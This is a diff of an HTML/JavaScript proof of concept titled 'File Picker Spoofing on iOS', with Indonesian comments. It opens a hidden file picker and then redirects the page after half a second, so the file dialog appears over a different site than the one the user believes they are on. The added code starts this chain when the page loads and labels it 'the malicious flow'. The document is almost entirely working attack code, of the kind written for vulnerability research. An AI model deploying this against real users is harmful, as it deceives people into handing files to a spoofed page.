@@ -5,38 +5,48 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>File Picker Spoofing on iOS</title>
     <script>
-        // Fungsi untuk memicu file picker
+        // Fungsi untuk memicu file picker dan memanipulasi file input
         function openFilePicker() {
             const fileInput = document.createElement('input');
             fileInput.type = 'file';
-            fileInput.accept = 'image/*';  // Misalnya hanya file gambar yang diterima
-            fileInput.style.display = 'none';
+            fileInput.accept = 'image/*';  // Menerima hanya file gambar, misalnya
+            fileInput.style.display = 'none';  // Menyembunyikan elemen file input dari pengguna
 
+            // Menangani perubahan (file dipilih)
             fileInput.addEventListener('change', (event) => {
                 const file = event.target.files[0];
                 if (file) {
                     console.log('File selected:', file.name);
+                    // Simulasi pengunduhan file yang dipilih (atau dapat diproses lebih lanjut)
                 }
             });
 
+            // Menambahkan elemen file input ke dalam halaman dan memicu klik
             document.body.appendChild(fileInput);
-            fileInput.click();  // Memicu dialog file picker
+            fileInput.click();  // Memunculkan dialog pemilihan file
         }
 
-        // Fungsi untuk memanipulasi navigasi setelah file picker
+        // Fungsi untuk memicu navigasi yang cepat setelah file picker muncul
         function spoofNavigation() {
-            openFilePicker();  // Panggil file picker
+            openFilePicker();  // Memicu file picker
             setTimeout(() => {
-                window.location.href = 'https://www.google.com';  // Pindahkan halaman setelah memilih file
-            }, 1000);  // Menunggu 1 detik sebelum navigasi
+                // Navigasi cepat setelah file picker dimunculkan
+                window.location.href = 'https://www.google.com';  // Alamat yang dipilih untuk navigasi
+            }, 500);  // Waktu tunggu sebelum melakukan navigasi (setengah detik)
         }
+
+        // Fungsi untuk menguatkan efek spoofing dengan lebih banyak interaksi pengguna
+        function enhancedSpoofing() {
+            document.body.innerHTML = "<h1>Click anywhere to trigger the malicious flow.</h1>"; // Reset halaman agar lebih menarik
+            document.addEventListener('click', () => {
+                spoofNavigation();  // Panggil spoofing navigasi dan file picker
+            });
+        }
+
+        window.onload = enhancedSpoofing;  // Memulai spoofing setelah halaman dimuat
     </script>
 </head>
 <body>
-    <h1>Click anywhere to start the spoofing test</h1>
-    <script>
-        // Menunggu klik pengguna untuk memicu file picker
-        document.addEventListener('click', spoofNavigation);
-    </script>
+    <h1>Loading...</h1>  <!-- Tampilan awal yang akan diganti setelah halaman dimuat -->
 </body>
 </html>
